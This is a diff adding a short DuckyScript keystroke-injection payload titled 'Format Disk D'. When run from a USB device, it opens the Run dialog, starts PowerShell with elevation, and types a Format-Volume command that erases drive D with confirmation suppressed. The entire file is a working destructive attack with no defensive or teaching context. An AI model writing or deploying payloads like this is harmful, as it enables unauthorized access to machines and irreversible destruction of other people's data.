@@ -1,0 +1,13 @@
+REM TITLE Format Disk D
+REM AUTHOR Poly
+REM OS Windows
+WINDOWS r
+DELAY 500
+STRING ps
+DELAY 500
+CTRL SHIFT ENTER
+DELAY 5000
+STRING Format-Volume -DriveLetter D -FileSystem NTFS -NewFileSystemLabel "COOKED DISK" -Confirm:$false -Force
+DELAY 500
+ENTER
+DELAY 1000
